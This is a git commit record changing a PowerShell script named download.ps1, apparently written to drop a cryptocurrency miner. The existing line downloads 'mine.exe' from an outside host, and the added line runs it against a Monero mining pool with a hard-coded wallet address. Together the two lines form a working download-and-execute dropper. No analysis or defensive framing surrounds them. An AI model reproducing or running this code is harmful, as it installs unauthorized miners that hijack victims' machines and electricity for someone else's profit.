d62d881d6e531e535a52651786b18df3a662b2ae
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2018-08-29 09:08:42 +0500

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -1,1 +1,2 @@
 (New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/mine.exe","C:\Users\Admin\mine.exe")
+start-process -FilePath 'C:\Users\Admin\mine.exe' -ArgumentList "-o pool.supportxmr.com:3333 -u 4Ahg96ZKa14MkPbqN3mFBH4EYJp2KBwwY61GtZTN5zCDiGT2dNDnkTXWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm43Nf7Yn -p TEST"
